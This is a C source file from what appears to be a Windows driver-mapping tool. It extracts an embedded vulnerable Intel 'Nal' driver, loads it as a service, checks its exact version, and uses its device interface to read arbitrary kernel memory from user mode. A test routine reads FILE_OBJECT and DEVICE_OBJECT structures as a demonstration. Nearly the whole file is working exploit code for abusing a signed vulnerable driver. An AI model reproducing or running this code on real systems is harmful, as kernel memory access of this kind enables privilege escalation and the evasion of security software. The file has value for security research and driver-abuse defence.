/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020
*
*  TITLE:       DRVMAP.C
*
*  VERSION:     1.01
*
*  DATE:        20 Apr 2020
*
*  Driver mapping routines.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/
#include "global.h"

#pragma comment(lib, "version.lib")

#define PROVIDER_NAME   L"IntelNal"
#define PROVIDER_DEVICE L"Nal"

//
// Provider version we expect.
//
#define PROVIDER_VER_MAJOR      1
#define PROVIDER_VER_MINOR      3
#define PROVIDER_VER_BUILD      0
#define PROVIDER_VER_REVISION   7

BOOLEAN g_DriverAlreadyLoaded = FALSE;

/*
* VirtualToPhysical
*
* Purpose:
*
* Provider wrapper for VirtualToPhysical routine.
*
*/
BOOL WINAPI VirtualToPhysical(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR VirtualAddress,
    _Out_ ULONG_PTR* PhysicalAddress)
{
    printf_s("%s(%p, 0x%llx, OutParam)\r\n",
        __FUNCTION__, DeviceHandle, VirtualAddress);

    return NalVirtualToPhysical(DeviceHandle,
        VirtualAddress,
        PhysicalAddress);
}

/*
* ReadKernelVM
*
* Purpose:
*
* Provider wrapper for ReadKernelVM routine.
*
*/
BOOL WINAPI ReadKernelVM(
    _In_ HANDLE DeviceHandle,
    _In_ ULONG_PTR Address,
    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
    _In_ ULONG NumberOfBytes)
{
    printf_s("%s(%p, 0x%llx, 0x%p, %lu)\r\n",
        __FUNCTION__, DeviceHandle, Address, Buffer, NumberOfBytes);

    if (Address < g_MaximumUserModeAddress) {
        printf_s("%s Address is below MaximumUserModeAddress, abort\r\n", __FUNCTION__);
        SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }

    return NalReadVirtualMemoryEx(DeviceHandle,
        Address,
        Buffer,
        NumberOfBytes);
}

/*
* ValidateLoadedDriver
*
* Purpose:
*
* Examine loaded driver if it has newer version, if so - we cannot use it.
*
*/
BOOL ValidateLoadedDriver(
    _In_ LPWSTR DriverServiceName,
    _Out_ PBOOL QueryFailed
)
{
    BOOL bDrvValid = FALSE;
    HANDLE schManager = NULL, schService = NULL;
    QUERY_SERVICE_CONFIG* lpsc = NULL;
    DWORD dwBytesNeeded = 0, dwError, cbBufSize = 0;

    ULONG ulDisp, ulMajor, ulMinor, ulBuild, ulRevision;

    NTSTATUS ntStatus;
    RTL_UNICODE_STRING_BUFFER dosPath;
    WCHAR szConversionBuffer[MAX_PATH * 2];

    SUP_VERINFO_NUMBERS verInfo;

    *QueryFailed = FALSE;

    do {

        //
        // Open SCM.
        //
        schManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
        if (schManager == NULL) {
            printf_s("[!] OpenSCManager failed (Error %lu)\r\n", GetLastError());
            *QueryFailed = TRUE;
            break;
        }

        //
        // Open provider service.
        //
        schService = OpenService(schManager, DriverServiceName, SERVICE_QUERY_CONFIG);
        if (schService == NULL) {
            printf_s("[!] OpenService failed (Error %lu)\r\n", GetLastError());
            *QueryFailed = TRUE;
            break;
        }

        printf_s("[!] Vulnerable provider device already exist, checking loaded driver version\r\n");

        //
        // Query service binary file.
        //
        // 1st: query required size and allocate required buffer.
        //
        if (!QueryServiceConfig(
            schService,
            NULL,
            0,
            &dwBytesNeeded))
        {
            dwError = GetLastError();
            if (ERROR_INSUFFICIENT_BUFFER == dwError)
            {
                cbBufSize = dwBytesNeeded;
                lpsc = (LPQUERY_SERVICE_CONFIG)supHeapAlloc(cbBufSize);
            }
            else
            {
                printf_s("[!] QueryServiceConfig failed (Error %lu)\r\n", dwError);
                *QueryFailed = TRUE;
                break;
            }
        }

        if (lpsc == NULL) {
            printf_s("[!] Could not allocate memory for service config query\r\n");
            *QueryFailed = TRUE;
            break;
        }

        //
        // Read service config.
        //
        if (!QueryServiceConfig(
            schService,
            lpsc,
            cbBufSize,
            &dwBytesNeeded))
        {
            printf("[!] QueryServiceConfig failed (Error %lu)\r\n", GetLastError());
            *QueryFailed = TRUE;
            break;
        }

        //
        // Convert filename from Nt to Dos type (remove \??\).
        //
        RtlSecureZeroMemory(&szConversionBuffer, sizeof(szConversionBuffer));
        RtlSecureZeroMemory(&dosPath, sizeof(dosPath));
        RtlInitUnicodeString(&dosPath.String, lpsc->lpBinaryPathName);

        //
        // Ensure conversion buffer length is enough.
        //
        RtlInitBuffer(&dosPath.ByteBuffer, (PUCHAR)szConversionBuffer, sizeof(szConversionBuffer));
        ntStatus = RtlEnsureBufferSize(RTL_ENSURE_BUFFER_SIZE_NO_COPY,
            &dosPath.ByteBuffer,
            dosPath.String.MaximumLength);

        if (!NT_SUCCESS(ntStatus)) {
            printf("[!] RtlEnsureBufferSize NTSTATUS (0x%lX)\r\n", ntStatus);
            *QueryFailed = TRUE;
            break;
        }

        //
        // Copy filename to buffer.
        //
        RtlCopyMemory(dosPath.ByteBuffer.Buffer,
            dosPath.String.Buffer,
            dosPath.String.MaximumLength);

        //
        // Update pointer.
        //
        dosPath.String.Buffer = (PWSTR)dosPath.ByteBuffer.Buffer;

        ntStatus = RtlNtPathNameToDosPathName(0, &dosPath, &ulDisp, NULL);
        if (!NT_SUCCESS(ntStatus)) {
            printf("[!] RtlNtPathNameToDosPathName NTSTATUS (0x%lX)\r\n", ntStatus);
            *QueryFailed = TRUE;
            break;
        }

        //
        // Query driver file version.
        //
        verInfo.VersionLS = 0xFFFFFFFF;
        verInfo.VersionMS = 0xFFFFFFFF;
#pragma warning(push)
#pragma warning(disable: 6054)
        if (!supGetImageVersionInfo(dosPath.String.Buffer, &verInfo)) {
            printf("[!] supGetImageVersionInfo failed, (Error %lu)\r\n", GetLastError());
            *QueryFailed = TRUE;
            break;
        }
#pragma warning(pop)

        ulMajor = (verInfo.VersionMS >> 16) & 0xffff;
        ulMinor = verInfo.VersionMS & 0xffff;
        ulBuild = (verInfo.VersionLS >> 16) & 0xffff;
        ulRevision = verInfo.VersionLS & 0xffff;

        printf_s("LDR: Currently loaded driver version %lu.%lu.%lu.%lu, required version %lu.%lu.%lu.%lu\r\n",
            ulMajor,
            ulMinor,
            ulBuild,
            ulRevision,
            PROVIDER_VER_MAJOR,
            PROVIDER_VER_MINOR,
            PROVIDER_VER_BUILD,
            PROVIDER_VER_REVISION);

        //
        // Check version values against known, abort on any mismatch.
        //
        if ((ulMajor != PROVIDER_VER_MAJOR) ||
            (ulMinor != PROVIDER_VER_MINOR) ||
            (ulBuild != PROVIDER_VER_BUILD) ||
            (ulRevision != PROVIDER_VER_REVISION))
        {
            printf_s("[!] Driver version is unknown and we cannot continue.\r\n"\
                "If you still want to use this loader find and uninstall software that uses this driver first!\r\n");
            SetLastError(ERROR_UNKNOWN_REVISION);
            break;
        }
        else {
            printf_s("LDR: Loaded driver version is compatible, processing next\r\n");
        }

        bDrvValid = TRUE;

    } while (FALSE);

    if (schService) CloseServiceHandle(schService);
    if (schManager) CloseServiceHandle(schManager);
    if (lpsc) supHeapFree(lpsc);

    return bDrvValid;
}

/*
* LoadVulnerableDriver
*
* Purpose:
*
* Load vulnerable driver and return handle for it device or NULL in case of error.
*
*/
HANDLE LoadVulnerableDriver(
    _In_ ULONG uResourceId,
    _In_ HINSTANCE hInstance,
    _In_ LPWSTR lpDriverName,
    _In_ LPWSTR lpDeviceName,
    _In_ LPWSTR lpFullFileName
)
{
    BOOL     bLoaded = FALSE;
    PBYTE    drvBuffer;
    NTSTATUS ntStatus;
    ULONG    resourceSize = 0;
    HANDLE   deviceHandle = NULL;

    printf_s("[>] Entering %s\r\n", __FUNCTION__);

    //
    // Driver is not loaded, load it.
    //

    drvBuffer = supQueryResourceData(uResourceId, hInstance, &resourceSize);
    if (drvBuffer == NULL) {
        printf_s("[!] Driver resource id not found %lu\r\n", uResourceId);
        return NULL;
    }
   
    if (resourceSize != (ULONG)supWriteBufferToFile(lpFullFileName,
        drvBuffer,
        resourceSize,
        TRUE,
        FALSE,
        &ntStatus))
    {
        printf_s("[!] Unable to extract vulnerable driver, NTSTATUS (0x%lX)\r\n", ntStatus);
        return NULL;
    }

    ntStatus = supLoadDriver(lpDriverName, lpFullFileName, FALSE);
    if (NT_SUCCESS(ntStatus)) {
        printf_s("LDR: Vulnerable driver \"%ws\" loaded\r\n", lpDriverName);
        bLoaded = TRUE;
    }
    else {
        printf_s("[!] Unable to load vulnerable driver, NTSTATUS (0x%lX)\r\n", ntStatus);
        DeleteFile(lpFullFileName);
    }


    if (bLoaded) {
        ntStatus = supOpenDriver(lpDeviceName, &deviceHandle);
        if (!NT_SUCCESS(ntStatus))
            printf_s("[!] Unable to open vulnerable driver, NTSTATUS (0x%lX)\r\n", ntStatus);
        else
            printf_s("LDR: Vulnerable driver opened, handle 0x%p\r\n", deviceHandle);
    }

    printf_s("[<] Leaving %s\r\n", __FUNCTION__);

    return deviceHandle;
}

/*
* StartVulnerableDriver
*
* Purpose:
*
* Load vulnerable driver and return handle for it device or NULL in case of error.
*
*/
HANDLE StartVulnerableDriver(
    _In_ ULONG uResourceId,
    _In_ HINSTANCE hInstance,
    _In_ LPWSTR lpDriverName,
    _In_ LPWSTR lpDeviceName,
    _In_ LPWSTR lpFullFileName
)
{
    BOOL     bLoaded = FALSE, bQueryFailed = FALSE;
    NTSTATUS ntStatus;
    ULONG    resourceSize = 0;
    HANDLE   deviceHandle = NULL;

    printf_s("[>] Entering %s\r\n", __FUNCTION__);

    g_DriverAlreadyLoaded = FALSE;

    //
    // Check if driver already loaded.
    //
    if (supIsObjectExists((LPWSTR)L"\\Device", lpDeviceName)) {
        g_DriverAlreadyLoaded = TRUE;
        bLoaded = ValidateLoadedDriver(PROVIDER_DEVICE, &bQueryFailed);
        if (bQueryFailed) {
            g_DriverAlreadyLoaded = FALSE;
            supUnloadDriver(lpDriverName, TRUE);
            deviceHandle = LoadVulnerableDriver(uResourceId,
                hInstance, lpDriverName, lpDeviceName, lpFullFileName);
        }
        else {

            if (bLoaded) {
                ntStatus = supOpenDriver(lpDeviceName, &deviceHandle);
                if (!NT_SUCCESS(ntStatus))
                    printf_s("[!] Unable to open vulnerable driver, NTSTATUS (0x%lX)\r\n", ntStatus);
                else
                    printf_s("LDR: Vulnerable driver opened, handle 0x%p\r\n", deviceHandle);
            }

        }
    }
    else {
        deviceHandle = LoadVulnerableDriver(uResourceId,
            hInstance, lpDriverName, lpDeviceName, lpFullFileName);     
    }

    printf_s("[<] Leaving %s\r\n", __FUNCTION__);

    return deviceHandle;
}

/*
* StopVulnerableDriver
*
* Purpose:
*
* Unload previously loaded vulnerable driver.
*
*/
void StopVulnerableDriver(
    _In_ LPWSTR lpDriverName,
    _In_opt_ LPWSTR lpFullFileName
)
{
    NTSTATUS ntStatus;

    printf_s("[>] Entering %s\r\n", __FUNCTION__);

    if (g_DriverAlreadyLoaded) {
        printf_s("[!] Vulnerable driver wasn't loaded, skip\r\n");
    }
    else {

        ntStatus = supUnloadDriver(lpDriverName, TRUE);
        if (!NT_SUCCESS(ntStatus)) {
            printf_s("[!] Unable to unload vulnerable driver, NTSTATUS (0x%lX)\r\n", ntStatus);
        }
        else {

            printf_s("LDR: Vulnerable driver unloaded\r\n");
            ULONG retryCount = 3;

            if (lpFullFileName) {
                do {
                    Sleep(1000);
                    if (DeleteFile(lpFullFileName)) {
                        printf_s("LDR: Vulnerable driver file removed\r\n");
                        break;
                    }

                    retryCount--;

                } while (retryCount);
            }
        }

    }

    printf_s("[<] Leaving %s\r\n", __FUNCTION__);
}

/*
* ProviderCreate
*
* Purpose:
*
* Load vulnerable driver and return it device handle and filename.
*
*/
BOOL ProviderCreate(
    _Out_ HANDLE* DeviceHandle,
    _Out_ LPWSTR* DriverFileName)
{
    BOOL bResult = FALSE;
    HANDLE deviceHandle = NULL;
    HINSTANCE hInstance = GetModuleHandle(NULL);
    LPWSTR driverFileName;

    *DeviceHandle = NULL;
    *DriverFileName = NULL;

    printf_s("[>] Entering %s\r\n", __FUNCTION__);

    do {

        PUNICODE_STRING CurrentDirectory = &NtCurrentPeb()->ProcessParameters->CurrentDirectory.DosPath;
        SIZE_T length = 64 +
            (_strlen(PROVIDER_NAME) * sizeof(WCHAR)) +
            CurrentDirectory->Length;

        //
        // Build filename for vulnerable driver.
        //
        driverFileName = (LPWSTR)supHeapAlloc(length);
        if (driverFileName == NULL) {
            printf_s("[!] Could not allocate memory for driver name (Error %lu)\r\n", GetLastError());
            break;
        }

        length = CurrentDirectory->Length / sizeof(WCHAR);

        _strncpy(driverFileName,
            length,
            CurrentDirectory->Buffer,
            length);

        _strcat(driverFileName, TEXT("\\"));
        _strcat(driverFileName, PROVIDER_NAME);
        _strcat(driverFileName, TEXT(".sys"));

        //
        // Install and run vulnerable driver.
        //
        deviceHandle = StartVulnerableDriver(IDR_iQVM64,
            hInstance,
            PROVIDER_NAME,
            PROVIDER_DEVICE,
            driverFileName);

        if (deviceHandle == NULL) {
            supHeapFree(driverFileName);
            *DeviceHandle = NULL;
            *DriverFileName = NULL;
        }
        else {
            *DeviceHandle = deviceHandle;
            *DriverFileName = driverFileName;
            bResult = TRUE;
        }

    } while (FALSE);

    printf_s("[<] Leaving %s\r\n", __FUNCTION__);

    return bResult;
}

/*
* ProviderRelease
*
* Purpose:
*
* Unload vulnerable driver and free resources.
*
*/
VOID ProviderRelease(
    _In_ HANDLE DeviceHandle,
    _In_ LPWSTR DriverFileName)
{
    printf_s("[>] Entering %s\r\n", __FUNCTION__);

    if (DeviceHandle) {
        CloseHandle(DeviceHandle);
        StopVulnerableDriver(PROVIDER_NAME, DriverFileName);

        if (DriverFileName)
            supHeapFree(DriverFileName);
    }

    printf_s("[<] Leaving %s\r\n", __FUNCTION__);
}

BOOL TestRead()
{
    LPWSTR driverFileName = NULL;
    HANDLE providerHandle = NULL;
    ULONG_PTR objectAddress = 0;
    FILE_OBJECT fileObject;
    DEVICE_OBJECT deviceObject;

    printf_s("[>] Entering %s\r\n", __FUNCTION__);

    if (!ProviderCreate(&providerHandle, &driverFileName)) {
        printf_s("[!] ProviderCreate failed, abort\r\n");
        printf_s("[<] Leaving %s\r\n", __FUNCTION__);
        return FALSE;
    }

    RtlZeroMemory(&fileObject, sizeof(fileObject));
    RtlZeroMemory(&deviceObject, sizeof(deviceObject));

    if (supQueryObjectFromHandle(providerHandle, &objectAddress)) {

        if (!ReadKernelVM(providerHandle, objectAddress, &fileObject, sizeof(FILE_OBJECT))) {
            printf_s("[!] ReadKernelVM(FILE_OBJECT) failed\r\n");
        }
        else {

            printf_s("FILE_OBJECT->DeviceObject 0x%p\r\n", fileObject.DeviceObject);
            if ((ULONG_PTR)fileObject.DeviceObject < g_MaximumUserModeAddress) {
                printf_s("[!] Invalid DeviceObject address\r\n");
            }
            else {

                if (!ReadKernelVM(providerHandle, (ULONG_PTR)fileObject.DeviceObject, &deviceObject, sizeof(DEVICE_OBJECT))) {
                    printf_s("[!] ReadKernelVM(DEVICE_OBJECT) failed\r\n");
                }
                else {
                    printf_s("DEVICE_OBJECT->DriverObject 0x%p\r\n", deviceObject.DriverObject);
                }

            }

        }
    }
    else {
        printf_s("[!] supQueryObjectFromHandle failed\r\n");
    }

    ProviderRelease(providerHandle, driverFileName);
    printf_s("[<] Leaving %s\r\n", __FUNCTION__);
    return TRUE;
}
